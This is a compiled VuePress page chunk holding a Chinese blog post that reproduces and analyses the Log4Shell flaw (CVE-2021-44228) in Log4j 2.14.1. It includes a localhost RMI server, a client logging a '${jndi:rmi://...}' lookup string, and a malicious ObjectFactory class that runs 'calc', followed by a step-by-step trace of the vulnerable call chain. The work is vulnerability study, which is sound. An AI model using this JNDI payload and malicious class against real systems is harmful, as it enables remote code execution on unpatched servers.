(window.webpackJsonp=window.webpackJsonp||[]).push([[24],{432:function(t,s,a){"use strict";a.r(s);var e=a(2),n=Object(e.a)({},(function(){var t=this,s=t._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[s("h2",{attrs:{id:"log4j2漏洞分析-cve-2021-44228"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#log4j2漏洞分析-cve-2021-44228"}},[t._v("#")]),t._v(" log4j2漏洞分析（CVE-2021-44228）")]),t._v(" "),s("h3",{attrs:{id:"_0x01-漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_0x01-漏洞描述"}},[t._v("#")]),t._v(" 0x01 漏洞描述")]),t._v(" "),s("p",[t._v("Apache Log4j2 是 Apache 的一个开源项目，Apache Log4j2 是一个基于 Java 的日志记录工具，使用非常广泛，被大量企业和系统索使用，漏洞触发及其简单，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置。")]),t._v(" "),s("p",[t._v("影响范围：Apache Log4j 2.x<=2.14.1")]),t._v(" "),s("h3",{attrs:{id:"_0x02-漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_0x02-漏洞复现"}},[t._v("#")]),t._v(" 0x02 漏洞复现")]),t._v(" "),s("p",[t._v("使用maven引入相关组件，相应的pom.xml文件：")]),t._v(" "),s("div",{staticClass:"language-xml line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-xml"}},[s("code",[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("dependencies")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("dependency")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("groupId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("org.apache.logging.log4j"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("groupId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("artifactId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("log4j-core"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("artifactId")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("version")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("2.14.1"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("version")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("dependency")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token tag"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("dependencies")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br")])]),s("p",[t._v("下面的复现利用的是log4j2提供的jndi功能，自己手动构建恶意类的方式调用")]),t._v(" "),s("p",[t._v("服务端：")]),t._v(" "),s("div",{staticClass:"language-java line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-java"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("public")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Rmiserver")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("public")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("static")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("void")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("String")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" args"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("throws")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Exception")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Registry")]),t._v(" registry "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("LocateRegistry")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("createRegistry")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("12345")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Reference")]),t._v(" reference "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("new")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Reference")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Hello"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Hello"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("\n                "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://127.0.0.1:8080/"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("ReferenceWrapper")]),t._v(" referenceWrapper "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("new")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("ReferenceWrapper")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("reference"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        registry"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("bind")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"obj"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" referenceWrapper"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br")])]),s("p",[t._v("客户端：")]),t._v(" "),s("div",{staticClass:"language-java line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-java"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("public")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Log4jTEst")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("public")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("static")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("void")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("String")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" args"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Logger")]),t._v(" logger "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("LogManager")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getLogger")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        logger"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("error")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"${jndi:rmi://127.0.0.1:12345/obj}"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br")])]),s("p",[t._v("恶意类：")]),t._v(" "),s("div",{staticClass:"language-java line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-java"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("public")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("class")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Hello")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("implements")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("ObjectFactory")]),t._v("  "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n\n    "),s("span",{pre:!0,attrs:{class:"token annotation punctuation"}},[t._v("@Override")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("public")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Object")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getObjectInstance")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Object")]),t._v(" obj"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Name")]),t._v(" name"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Context")]),t._v(" nameCtx"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Hashtable")]),s("span",{pre:!0,attrs:{class:"token generics"}},[s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v(" environment"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("throws")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Exception")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("System")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("out"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("println")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"hello"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("Runtime")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("getRuntime")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("exec")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"calc"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("null")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br")])]),s("p",[t._v("复现：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606150934.png",alt:"image-20220606150933683"}})]),t._v(" "),s("h3",{attrs:{id:"_0x03-漏洞调用链分析"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_0x03-漏洞调用链分析"}},[t._v("#")]),t._v(" 0x03 漏洞调用链分析")]),t._v(" "),s("p",[t._v("关键调用链")]),t._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("LOGGER.error\n  ......\n    MessagePatternConverter.format\n      ....\n        StrSubstitutor.resolveVariable\n          Interpolator.lookup\n            JndiLookup.lookup\n              JndiManager.lookup\n                InitialContext.lookup\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br"),s("span",{staticClass:"line-number"},[t._v("2")]),s("br"),s("span",{staticClass:"line-number"},[t._v("3")]),s("br"),s("span",{staticClass:"line-number"},[t._v("4")]),s("br"),s("span",{staticClass:"line-number"},[t._v("5")]),s("br"),s("span",{staticClass:"line-number"},[t._v("6")]),s("br"),s("span",{staticClass:"line-number"},[t._v("7")]),s("br"),s("span",{staticClass:"line-number"},[t._v("8")]),s("br"),s("span",{staticClass:"line-number"},[t._v("9")]),s("br")])]),s("p",[t._v("在入口点logger.error()打上断点：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606151109.png",alt:"image-20220606151109583"}})]),t._v(" "),s("p",[t._v("进入"),s("code",[t._v("org.apache.logging.log4j.spi#error")]),t._v("：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606151734.png",alt:"image-20220606151733961"}})]),t._v(" "),s("p",[s("code",[t._v("org.apache.logging.log4j.spi#logIfEnabled")]),t._v("：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606152129.png",alt:"image-20220606152129024"}})]),t._v(" "),s("p",[s("code",[t._v("org.apache.logging.log4j.spi#logMessageTrackRecursion")]),t._v("：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606152226.png",alt:"image-20220606152226076"}})]),t._v(" "),s("p",[t._v("就这样一步步递归，走到关键点"),s("code",[t._v("org.apache.logging.log4j.core.appender#directEncodeEvent")]),t._v("。该方法的第一行代码将返回当前使用的布局，并调用对应布局处理器的encode方法")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606152427.png",alt:"image-20220606152427303"}})]),t._v(" "),s("p",[t._v("log4j2默认缺省布局使用的是PatternLayout：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606152909.png",alt:"image-20220606152908926"}})]),t._v(" "),s("p",[t._v("继续跟进在encode中会调用toText方法，根据注释该方法的作用为创建指定日志事件的文本表示形式，并将其写入指定的StringBuilder中。"),s("code",[t._v("org.apache.logging.log4j.core.layout#encode")])]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606153233.png",alt:"image-20220606153233315"}})]),t._v(" "),s("p",[t._v("跟进toText方法："),s("code",[t._v("org.apache.logging.log4j.core.layout#toText")])]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606153334.png",alt:"image-20220606153334624"}})]),t._v(" "),s("p",[t._v("接下来会调用"),s("code",[t._v("serializer.toSerializable")]),t._v("，并在这个方法中调用不同的Converter来处理传入的数据，如下图所示，")]),t._v(" "),s("p",[t._v("这里一步步将event添加到buf中：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606153723.png",alt:"image-20220606153723600"}})]),t._v(" "),s("p",[t._v("一直添加到：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606153811.png",alt:"image-20220606153811581"}})]),t._v(" "),s("p",[t._v("开始解析"),s("code",[t._v("${")]),t._v("。"),s("code",[t._v("org.apache.logging.log4j.core.pattern#format")])]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606154019.png",alt:"image-20220606154019040"}})]),t._v(" "),s("p",[t._v("下面有一个关键点。这里对日志消息进行格式化，其中很明显的看到有针对字符”$”和”{“的判断，而且是连着判断，等同于判断是否存在”${“，这三行代码中关键点在于最后一行")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606154051.png",alt:"image-20220606154051465"}})]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606154442.png",alt:"image-20220606154441647"}})]),t._v(" "),s("p",[t._v("注意此时的workingBuilder是一个StringBuilder对象，该对象存放的字符串如下所示")]),t._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[t._v("15.23.39.893 [main] ERROR Log4jTEst - ${jndi:rmi://127.0.0.1/obj}\n")])]),t._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[t._v("1")]),s("br")])]),s("p",[t._v("本来这段字符串的长度是63，但是却给它改成了38，为什么呢？因为第38的位置就是"),s("code",[t._v("$")]),t._v("符号，也就是说只保留"),s("code",[t._v("$")]),t._v("之前的，"),s("code",[t._v("${jndi:rmi://127.0.0.1/obj}")]),t._v("这段不要了，从第38位开始append。而append的内容是什么呢？可以看到传入的参数是config.getStrSubstitutor().replace(event, value)的执行结果，其中的value就是"),s("code",[t._v("${jndi:rmi://127.0.0.1/obj}")]),t._v("这段字符串。也就是说这里append的字符串就是这段字符串replace后的内容。")]),t._v(" "),s("p",[t._v("replace的作用简单来说就是想要进行一个替换，我们继续跟进"),s("code",[t._v("org.apache.logging.log4j.core.lookup#replace")]),t._v("：")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606155051.png",alt:"image-20220606155051249"}})]),t._v(" "),s("p",[t._v("经过一系列的嵌套调用，来到了"),s("code",[t._v("org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute")]),t._v("。StrSubstitutor类提供了关键的 "),s("code",[t._v("DEFAULT_ESCAPE")]),t._v(" 是 "),s("code",[t._v("$")]),t._v("，"),s("code",[t._v("DEFAULT_PREFIX")]),t._v(" 前缀是 "),s("code",[t._v("${")]),t._v("，"),s("code",[t._v("DEFAULT_SUFFIX")]),t._v(" 后缀是 "),s("code",[t._v("}")]),t._v("，"),s("code",[t._v("DEFAULT_VALUE_DELIMITER_STRING")]),t._v(" 赋值分隔符是 "),s("code",[t._v(":-")]),t._v("，"),s("code",[t._v("ESCAPE_DELIMITER_STRING")]),t._v(" 是 "),s("code",[t._v(":\\-")])]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606200450.png",alt:"image-20220606200449819"}})]),t._v(" "),s("p",[t._v("这个类提供的 "),s("code",[t._v("substitute")]),t._v(" 方法，是整个 Lookup 功能的核心，用来递归替换相应的字符，这里来仔细看一下处理逻辑。")]),t._v(" "),s("p",[t._v("方法通过 while 循环逐个字符串寻找 "),s("code",[t._v("${")]),t._v(" 前缀")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606200554.png",alt:"image-20220606200554339"}})]),t._v(" "),s("p",[t._v("找到前缀后开始找后缀，但是在找后缀的 while 循环里，又判断了是否替换变量中的值，如果替换，则再匹配一次前缀，如果又找到了前缀，则 continue 跳出循环，再走一次找后缀的逻辑，用来满足变量中嵌套的情况。")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606200711.png",alt:"image-20220606200711471"}})]),t._v(" "),s("p",[t._v("后续的处理中，通过多个 if/else 用来匹配 "),s("code",[t._v(":-")]),t._v(" 和 "),s("code",[t._v(":\\-")])]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606200812.png",alt:"image-20220606200812347"}})]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606200846.png",alt:"image-20220606200846234"}})]),t._v(" "),s("p",[t._v("在没有匹配到变量赋值或处理结束后，将会调用 "),s("code",[t._v("resolveVariable")]),t._v(" 方法解析满足 Lookup 功能的语法，并执行相应的 lookup ，将返回的结果替换回原字符串后，再次调用 "),s("code",[t._v("substitute")]),t._v(" 方法进行递归解析。")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606155354.png",alt:"image-20220606155354466"}})]),t._v(" "),s("p",[t._v("跟进"),s("code",[t._v("org.apache.logging.log4j.core.lookup#resolveVariable")]),t._v("调用了lookup函数。")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606155814.png",alt:"image-20220606155814564"}})]),t._v(" "),s("p",[t._v("而这实际上是一个代理类 "),s("code",[t._v("Interpolator")]),t._v("，这个类在初始化时创建了一个 "),s("code",[t._v("strLookupMap")]),t._v(" ，将一些 lookup 功能关键字和处理类进行了映射，存放在这个 Map 中")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606160238.png",alt:"image-20220606160238614"}})]),t._v(" "),s("p",[t._v("处理和分发的关键逻辑在于其 "),s("code",[t._v("lookup")]),t._v(" 方法，通过 "),s("code",[t._v(":")]),t._v(" 作为分隔符来分隔 Lookup 关键字及参数，从"),s("code",[t._v("strLookupMap")]),t._v(" 中根据关键字"),s("code",[t._v("jndi")]),t._v("作为 key 匹配到对应的处理类"),s("code",[t._v("jndiLookup")]),t._v("，并调用其 lookup 方法。")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606160340.png",alt:"image-20220606160340327"}})]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606160430.png",alt:"image-20220606160429996"}})]),t._v(" "),s("p",[t._v("由此调用了jndiLookup方法，弹出了计算器")]),t._v(" "),s("p",[s("img",{attrs:{src:"https://raw.githubusercontent.com/Arielwyy/image-bed/master/img/20220606160616.png",alt:"image-20220606160615534"}})]),t._v(" "),s("h3",{attrs:{id:"_0x04-参考文献"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_0x04-参考文献"}},[t._v("#")]),t._v(" 0x04 参考文献")]),t._v(" "),s("ul",[s("li",[s("a",{attrs:{href:"https://www.anquanke.com/post/id/263325",target:"_blank",rel:"noopener noreferrer"}},[t._v("从零到一带你深入 log4j2 Jndi RCE CVE-2021-44228漏洞"),s("OutboundLink")],1)]),t._v(" "),s("li",[s("a",{attrs:{href:"https://tttang.com/archive/1378/",target:"_blank",rel:"noopener noreferrer"}},[t._v("浅谈 Log4j2 漏洞"),s("OutboundLink")],1)]),t._v(" "),s("li",[s("a",{attrs:{href:"https://cloud.tencent.com/developer/article/1919456",target:"_blank",rel:"noopener noreferrer"}},[t._v("史上最全 log4j2 远程命令执行漏洞汇总报告"),s("OutboundLink")],1)]),t._v(" 